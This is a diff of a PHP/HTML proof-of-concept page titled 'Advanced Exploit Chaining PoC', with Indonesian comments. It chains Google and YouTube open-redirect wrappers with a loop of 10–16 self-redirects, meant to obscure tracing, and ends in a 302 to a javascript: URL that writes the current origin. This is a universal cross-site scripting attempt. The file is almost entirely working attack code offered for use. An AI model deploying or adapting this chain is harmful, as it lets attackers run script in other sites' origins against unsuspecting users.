@@ -5,18 +5,19 @@ header("Pragma: no-cache");
 
 if (isset($_GET['redirect'])) {
     $redirect_count = isset($_GET['count']) ? (int)$_GET['count'] : 0;
+    $current_service = $_GET['service'] ?? 'google';
     
-    // Target akhir menggunakan skrip JavaScript inline untuk evaluasi origin aktif
+    // Payload akhir menggunakan skrip inline untuk mengevaluasi origin dinamis pada dokumen aktif
     $final_destination = "javascript:try{document.write('UXSS POC, Origin: ' + origin);}catch(e){document.write('Error: '+e.message);}";
 
-    // Loop pengalihan bertingkat untuk mengaburkan rentang pelacakan sebelum mencapai destinasi akhir
-    if ($redirect_count < rand(9, 15)) {
+    // Loop pengalihan bertingkat untuk mengaburkan rentang pelacakan perantara
+    if ($redirect_count < rand(10, 16)) {
         $redirect_count++;
-        $next_service = $_GET['service'] ?? 'google';
-        header("Location: ?service=" . urlencode($next_service) . "&redirect=1&count=" . $redirect_count, true, 302);
+        $next_url = "?service=" . urlencode($current_service) . "&redirect=1&count=" . $redirect_count;
+        header("Location: " . $next_url, true, 302);
         exit();
     } else {
-        usleep(500000); // Penundaan mikro 0.5 detik untuk stabilitas status navigasi
+        usleep(400000); // Penundaan mikro untuk stabilisasi navigasi terminal
         header("Location: " . $final_destination, true, 302);
         exit();
     }
@@ -27,7 +28,7 @@ if (isset($_GET['redirect'])) {
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Format.html - Advanced Exploit Chaining PoC</title>
+    <title>Kuatkan.html - Advanced Exploit Chaining PoC</title>
     <style>
       body, html {
         margin: 0; padding: 0; height: 100vh; width: 100vw;
@@ -40,10 +41,10 @@ if (isset($_GET['redirect'])) {
         text-align: center; max-width: 540px; padding: 24px; box-sizing: border-box;
       }
       a {
-        color: #58a6ff; font-size: 22px; text-decoration: none; font-weight: 600;
-        display: inline-block; padding: 18px 24px; background: #161b22;
-        border: 1px solid #30363d; border-radius: 10px;
-        box-shadow: 0 4px 14px rgba(0,0,0,0.5);
+        color: #58a6ff; font-size: 24px; text-decoration: none; font-weight: 600;
+        display: inline-block; padding: 20px 28px; background: #161b22;
+        border: 1px solid #30363d; border-radius: 12px;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.6);
         transition: background 0.2s, transform 0.1s;
       }
       a:hover { background: #1f6feb; color: #fff; }
@@ -56,32 +57,32 @@ if (isset($_GET['redirect'])) {
   <body>
     <div class="wrapper">
       <a href="javascript:start();">Tap here if not automatically redirected</a>
-      <div class="status" id="statusInfo">Status: Initializing chaining vector...</div>
+      <div class="status" id="statusInfo">Status: Initializing redirection payload vector...</div>
     </div>
 
     <script>
         const statusInfo = document.getElementById('statusInfo');
         
-        // Membentuk URL dasar file saat ini secara dinamis untuk wrapper eksternal
+        // Membentuk URL dasar file secara dinamis agar kompatibel dengan domain aktif Anda
         const currentBaseUrl = window.location.origin + window.location.pathname;
         const encodedParam = encodeURIComponent(currentBaseUrl + "?redirect=1&count=0");
 
-        // Endpoint perantara redirect resmi
-        const youtubeWrapper = 'https://www.youtube.com/redirect?q=' + encodedParam;
-        const googleWrapper = 'https://www.google.com/url?q=' + encodedParam + '&sa=D&sntz=1&usg=EXPLOIT_CHAIN_VECTOR';
+        // Wrapper pengalihan resmi
+        const youtubeUrl = 'https://www.youtube.com/redirect?q=' + encodedParam;
+        const googleUrl = 'https://www.google.com/url?q=' + encodedParam + '&sa=D&sntz=1&usg=EXPLOIT_CHAIN_BYPASS_VECTOR';
 
-        let targetUrl = googleWrapper;
+        let url = googleUrl;
         const urlParams = new URLSearchParams(window.location.search);
         
         if (urlParams.get('service') === 'youtube') {
-            targetUrl = youtubeWrapper;
+            url = youtubeUrl;
         }
 
         function start() {
-            statusInfo.innerText = "Status: Dispatching target navigation wrapper...";
+            statusInfo.innerText = "Status: Dispatching navigation target wrapper...";
             try {
                 // Membuka target melalui _self untuk menjaga kesinambungan history chaining
-                window.open(targetUrl, '_self');
+                window.open(url, '_self');
             } catch (err) {
                 statusInfo.innerText = "Status: Execution error: " + err.message;
             }
@@ -97,7 +98,7 @@ if (isset($_GET['redirect'])) {
                     }
                     start();
                 }
-            }, 300);
+            }, 250);
         });
     </script>
   </body>
